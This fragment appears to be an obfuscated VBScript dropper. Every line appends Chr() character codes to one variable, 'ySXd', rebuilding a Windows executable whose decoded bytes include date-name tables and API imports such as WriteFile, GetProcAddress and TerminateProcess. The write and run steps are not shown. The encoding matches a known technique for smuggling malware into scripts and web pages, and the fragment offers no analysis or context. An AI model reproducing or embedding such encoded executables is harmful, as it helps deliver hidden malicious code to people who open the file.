ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(77)&Chr(0)&Chr(0)&Chr(65)&Chr(77)&Chr(0)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(78)&Chr(111)&Chr(118)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(79)&Chr(99)&Chr(116)&Chr(111)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(83)&Chr(101)&Chr(112)&Chr(116)&Chr(101)&Chr(109)&Chr(98)&Chr(101)&Chr(114)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(117)&Chr(103)&Chr(117)&Chr(115)&Chr(116)&Chr(0)&Chr(0)&Chr(74)&Chr(117)&Chr(108)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(117)&Chr(110)&Chr(101)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(65)&Chr(112)&Chr(114)&Chr(105)&Chr(108)&Chr(0)&Chr(0)&Chr(0)&Chr(77)&Chr(97)&Chr(114)&Chr(99)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(101)&Chr(98)&Chr(114)
ySXd=ySXd&Chr(117)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(117)&Chr(97)&Chr(114)&Chr(121)&Chr(0)&Chr(68)&Chr(101)&Chr(99)&Chr(0)&Chr(78)&Chr(111)&Chr(118)&Chr(0)&Chr(79)&Chr(99)&Chr(116)&Chr(0)&Chr(83)&Chr(101)&Chr(112)&Chr(0)&Chr(65)&Chr(117)&Chr(103)&Chr(0)&Chr(74)&Chr(117)&Chr(108)&Chr(0)&Chr(74)&Chr(117)&Chr(110)&Chr(0)&Chr(77)&Chr(97)&Chr(121)&Chr(0)&Chr(65)&Chr(112)&Chr(114)&Chr(0)&Chr(77)&Chr(97)&Chr(114)&Chr(0)&Chr(70)&Chr(101)&Chr(98)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(0)&Chr(83)&Chr(97)&Chr(116)&Chr(117)&Chr(114)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(70)&Chr(114)&Chr(105)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(84)&Chr(104)&Chr(117)&Chr(114)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(101)&Chr(100)&Chr(110)
ySXd=ySXd&Chr(101)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(0)&Chr(84)&Chr(117)&Chr(101)&Chr(115)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(77)&Chr(111)&Chr(110)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(100)&Chr(97)&Chr(121)&Chr(0)&Chr(0)&Chr(83)&Chr(97)&Chr(116)&Chr(0)&Chr(70)&Chr(114)&Chr(105)&Chr(0)&Chr(84)&Chr(104)&Chr(117)&Chr(0)&Chr(87)&Chr(101)&Chr(100)&Chr(0)&Chr(84)&Chr(117)&Chr(101)&Chr(0)&Chr(77)&Chr(111)&Chr(110)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(0)&Chr(200)&Chr(178)&Chr(64)&Chr(0)&Chr(32)&Chr(179)&Chr(64)&Chr(0)&Chr(83)&Chr(117)&Chr(110)&Chr(77)&Chr(111)&Chr(110)&Chr(84)&Chr(117)&Chr(101)&Chr(87)&Chr(101)&Chr(100)&Chr(84)&Chr(104)&Chr(117)&Chr(70)&Chr(114)&Chr(105)&Chr(83)&Chr(97)&Chr(116)&Chr(0)&Chr(0)&Chr(0)&Chr(74)&Chr(97)&Chr(110)&Chr(70)&Chr(101)&Chr(98)&Chr(77)&Chr(97)
ySXd=ySXd&Chr(114)&Chr(65)&Chr(112)&Chr(114)&Chr(77)&Chr(97)&Chr(121)&Chr(74)&Chr(117)&Chr(110)&Chr(74)&Chr(117)&Chr(108)&Chr(65)&Chr(117)&Chr(103)&Chr(83)&Chr(101)&Chr(112)&Chr(79)&Chr(99)&Chr(116)&Chr(78)&Chr(111)&Chr(118)&Chr(68)&Chr(101)&Chr(99)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(72)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(248)&Chr(169)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(176)&Chr(146)&Chr(64)&Chr(0)&Chr(3)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(38)&Chr(0)&Chr(0)&Chr(128)&Chr(80)&Chr(0)&Chr(0)&Chr(44)&Chr(104)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(136)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(145)&Chr(17)&Chr(64)&Chr(0)&Chr(149)&Chr(17)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(87)&Chr(17)&Chr(64)&Chr(0)&Chr(107)&Chr(17)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(200)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(140)&Chr(20)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(140)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(135)&Chr(31)&Chr(64)&Chr(0)&Chr(139)&Chr(31)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(32)&Chr(34)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(47)&Chr(34)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(226)&Chr(35)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(238)&Chr(35)&Chr(64)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(98)&Chr(40)&Chr(64)&Chr(0)&Chr(102)&Chr(40)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(255)&Chr(41)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(45)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(216)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(107)&Chr(46)&Chr(64)&Chr(0)&Chr(127)&Chr(46)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(192)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(109)&Chr(48)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(253)&Chr(48)&Chr(64)&Chr(0)&Chr(20)&Chr(49)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(56)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(204)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(204)&Chr(60)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)
ySXd=ySXd&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(121)&Chr(61)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(14)&Chr(69)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(124)&Chr(83)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(226)&Chr(89)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(172)&Chr(91)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(208)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(17)&Chr(93)&Chr(64)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(212)&Chr(255)&Chr(255)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(95)&Chr(64)&Chr(0)&Chr(145)&Chr(95)&Chr(64)&Chr(0)
ySXd=ySXd&Chr(140)&Chr(149)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(148)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(128)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(116)&Chr(150)&Chr(0)&Chr(0)&Chr(134)&Chr(150)&Chr(0)&Chr(0)&Chr(152)&Chr(150)&Chr(0)&Chr(0)&Chr(182)&Chr(150)&Chr(0)&Chr(0)&Chr(202)&Chr(150)&Chr(0)&Chr(0)&Chr(210)&Chr(150)&Chr(0)&Chr(0)&Chr(228)&Chr(150)&Chr(0)&Chr(0)&Chr(242)&Chr(150)&Chr(0)&Chr(0)&Chr(254)&Chr(150)&Chr(0)&Chr(0)&Chr(14)&Chr(151)&Chr(0)&Chr(0)&Chr(36)&Chr(151)&Chr(0)&Chr(0)&Chr(62)&Chr(151)&Chr(0)&Chr(0)&Chr(86)&Chr(151)&Chr(0)&Chr(0)&Chr(112)&Chr(151)&Chr(0)&Chr(0)&Chr(134)&Chr(151)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(150)&Chr(151)&Chr(0)&Chr(0)&Chr(176)&Chr(151)&Chr(0)&Chr(0)&Chr(194)&Chr(151)&Chr(0)&Chr(0)&Chr(208)&Chr(151)&Chr(0)&Chr(0)&Chr(232)&Chr(151)&Chr(0)&Chr(0)&Chr(246)&Chr(151)&Chr(0)&Chr(0)&Chr(2)&Chr(152)&Chr(0)&Chr(0)&Chr(16)&Chr(152)&Chr(0)&Chr(0)&Chr(26)&Chr(152)&Chr(0)&Chr(0)&Chr(50)&Chr(152)&Chr(0)&Chr(0)&Chr(66)&Chr(152)&Chr(0)&Chr(0)&Chr(88)&Chr(152)&Chr(0)&Chr(0)&Chr(112)&Chr(152)&Chr(0)&Chr(0)&Chr(126)&Chr(152)&Chr(0)&Chr(0)&Chr(140)&Chr(152)&Chr(0)&Chr(0)&Chr(152)&Chr(152)&Chr(0)&Chr(0)&Chr(178)&Chr(152)&Chr(0)&Chr(0)&Chr(194)&Chr(152)&Chr(0)&Chr(0)&Chr(216)&Chr(152)&Chr(0)&Chr(0)&Chr(242)&Chr(152)&Chr(0)&Chr(0)&Chr(10)&Chr(153)&Chr(0)&Chr(0)&Chr(34)&Chr(153)&Chr(0)&Chr(0)&Chr(54)&Chr(153)&Chr(0)&Chr(0)&Chr(74)&Chr(153)&Chr(0)&Chr(0)&Chr(102)&Chr(153)&Chr(0)&Chr(0)
ySXd=ySXd&Chr(122)&Chr(153)&Chr(0)&Chr(0)&Chr(138)&Chr(153)&Chr(0)&Chr(0)&Chr(178)&Chr(153)&Chr(0)&Chr(0)&Chr(190)&Chr(153)&Chr(0)&Chr(0)&Chr(200)&Chr(153)&Chr(0)&Chr(0)&Chr(212)&Chr(153)&Chr(0)&Chr(0)&Chr(230)&Chr(153)&Chr(0)&Chr(0)&Chr(242)&Chr(153)&Chr(0)&Chr(0)&Chr(2)&Chr(154)&Chr(0)&Chr(0)&Chr(16)&Chr(154)&Chr(0)&Chr(0)&Chr(28)&Chr(154)&Chr(0)&Chr(0)&Chr(40)&Chr(154)&Chr(0)&Chr(0)&Chr(58)&Chr(154)&Chr(0)&Chr(0)&Chr(74)&Chr(154)&Chr(0)&Chr(0)&Chr(96)&Chr(154)&Chr(0)&Chr(0)&Chr(112)&Chr(154)&Chr(0)&Chr(0)&Chr(130)&Chr(154)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(0)&Chr(111)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(111)&Chr(109)&Chr(109)&Chr(97)&Chr(110)&Chr(100)&Chr(76)&Chr(105)&Chr(110)&Chr(101)&Chr(65)&Chr(0)&Chr(57)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(97)&Chr(114)&Chr(116)
ySXd=ySXd&Chr(117)&Chr(112)&Chr(73)&Chr(110)&Chr(102)&Chr(111)&Chr(65)&Chr(0)&Chr(21)&Chr(4)&Chr(83)&Chr(101)&Chr(116)&Chr(85)&Chr(110)&Chr(104)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(100)&Chr(69)&Chr(120)&Chr(99)&Chr(101)&Chr(112)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(70)&Chr(105)&Chr(108)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(249)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(77)&Chr(111)&Chr(100)&Chr(117)&Chr(108)&Chr(101)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(87)&Chr(0)&Chr(0)&Chr(33)&Chr(4)&Chr(83)&Chr(108)&Chr(101)&Chr(101)&Chr(112)&Chr(0)&Chr(32)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(65)&Chr(100)&Chr(100)&Chr(114)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(4)&Chr(1)&Chr(69)&Chr(120)&Chr(105)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(141)&Chr(4)
ySXd=ySXd&Chr(87)&Chr(114)&Chr(105)&Chr(116)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(0)&Chr(59)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(116)&Chr(100)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(0)&Chr(0)&Chr(244)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(77)&Chr(111)&Chr(100)&Chr(117)&Chr(108)&Chr(101)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(78)&Chr(97)&Chr(109)&Chr(101)&Chr(65)&Chr(0)&Chr(0)&Chr(74)&Chr(1)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(65)&Chr(0)&Chr(191)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(0)&Chr(75)&Chr(1)
ySXd=ySXd&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(87)&Chr(0)&Chr(122)&Chr(4)&Chr(87)&Chr(105)&Chr(100)&Chr(101)&Chr(67)&Chr(104)&Chr(97)&Chr(114)&Chr(84)&Chr(111)&Chr(77)&Chr(117)&Chr(108)&Chr(116)&Chr(105)&Chr(66)&Chr(121)&Chr(116)&Chr(101)&Chr(0)&Chr(230)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(0)&Chr(0)&Chr(193)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(69)&Chr(110)&Chr(118)&Chr(105)&Chr(114)&Chr(111)&Chr(110)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(83)&Chr(116)&Chr(114)&Chr(105)&Chr(110)&Chr(103)&Chr(115)&Chr(87)&Chr(0)&Chr(0)&Chr(232)&Chr(3)&Chr(83)&Chr(101)&Chr(116)&Chr(72)&Chr(97)&Chr(110)&Chr(100)&Chr(108)&Chr(101)&Chr(67)
ySXd=ySXd&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(215)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(84)&Chr(121)&Chr(112)&Chr(101)&Chr(0)&Chr(190)&Chr(0)&Chr(68)&Chr(101)&Chr(108)&Chr(101)&Chr(116)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(52)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(71)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(50)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(65)&Chr(108)&Chr(108)&Chr(111)&Chr(99)&Chr(0)&Chr(0)&Chr(53)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(83)&Chr(101)&Chr(116)&Chr(86)&Chr(97)&Chr(108)&Chr(117)&Chr(101)&Chr(0)&Chr(51)&Chr(4)&Chr(84)&Chr(108)&Chr(115)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(192)&Chr(2)&Chr(73)&Chr(110)&Chr(116)&Chr(101)
ySXd=ySXd&Chr(114)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(101)&Chr(100)&Chr(73)&Chr(110)&Chr(99)&Chr(114)&Chr(101)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(236)&Chr(3)&Chr(83)&Chr(101)&Chr(116)&Chr(76)&Chr(97)&Chr(115)&Chr(116)&Chr(69)&Chr(114)&Chr(114)&Chr(111)&Chr(114)&Chr(0)&Chr(0)&Chr(173)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(84)&Chr(104)&Chr(114)&Chr(101)&Chr(97)&Chr(100)&Chr(73)&Chr(100)&Chr(0)&Chr(0)&Chr(188)&Chr(2)&Chr(73)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(108)&Chr(111)&Chr(99)&Chr(107)&Chr(101)&Chr(100)&Chr(68)&Chr(101)&Chr(99)&Chr(114)&Chr(101)&Chr(109)&Chr(101)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(159)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(67)&Chr(114)&Chr(101)&Chr(97)&Chr(116)&Chr(101)&Chr(0)&Chr(0)&Chr(87)&Chr(4)&Chr(86)&Chr(105)&Chr(114)&Chr(116)
ySXd=ySXd&Chr(117)&Chr(97)&Chr(108)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(161)&Chr(2)&Chr(72)&Chr(101)&Chr(97)&Chr(112)&Chr(70)&Chr(114)&Chr(101)&Chr(101)&Chr(0)&Chr(0)&Chr(84)&Chr(3)&Chr(81)&Chr(117)&Chr(101)&Chr(114)&Chr(121)&Chr(80)&Chr(101)&Chr(114)&Chr(102)&Chr(111)&Chr(114)&Chr(109)&Chr(97)&Chr(110)&Chr(99)&Chr(101)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(0)&Chr(102)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(84)&Chr(105)&Chr(99)&Chr(107)&Chr(67)&Chr(111)&Chr(117)&Chr(110)&Chr(116)&Chr(0)&Chr(0)&Chr(170)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(73)&Chr(100)&Chr(0)&Chr(79)&Chr(2)&Chr(71)&Chr(101)&Chr(116)&Chr(83)&Chr(121)&Chr(115)&Chr(116)&Chr(101)&Chr(109)&Chr(84)&Chr(105)&Chr(109)&Chr(101)&Chr(65)
ySXd=ySXd&Chr(115)&Chr(70)&Chr(105)&Chr(108)&Chr(101)&Chr(84)&Chr(105)&Chr(109)&Chr(101)&Chr(0)&Chr(239)&Chr(2)&Chr(76)&Chr(101)&Chr(97)&Chr(118)&Chr(101)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(0)&Chr(217)&Chr(0)&Chr(69)&Chr(110)&Chr(116)&Chr(101)&Chr(114)&Chr(67)&Chr(114)&Chr(105)&Chr(116)&Chr(105)&Chr(99)&Chr(97)&Chr(108)&Chr(83)&Chr(101)&Chr(99)&Chr(116)&Chr(105)&Chr(111)&Chr(110)&Chr(0)&Chr(0)&Chr(45)&Chr(4)&Chr(84)&Chr(101)&Chr(114)&Chr(109)&Chr(105)&Chr(110)&Chr(97)&Chr(116)&Chr(101)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(0)&Chr(169)&Chr(1)&Chr(71)&Chr(101)&Chr(116)&Chr(67)&Chr(117)&Chr(114)&Chr(114)&Chr(101)&Chr(110)&Chr(116)&Chr(80)&Chr(114)&Chr(111)&Chr(99)&Chr(101)&Chr(115)&Chr(115)&Chr(0)&Chr(62)&Chr(4)
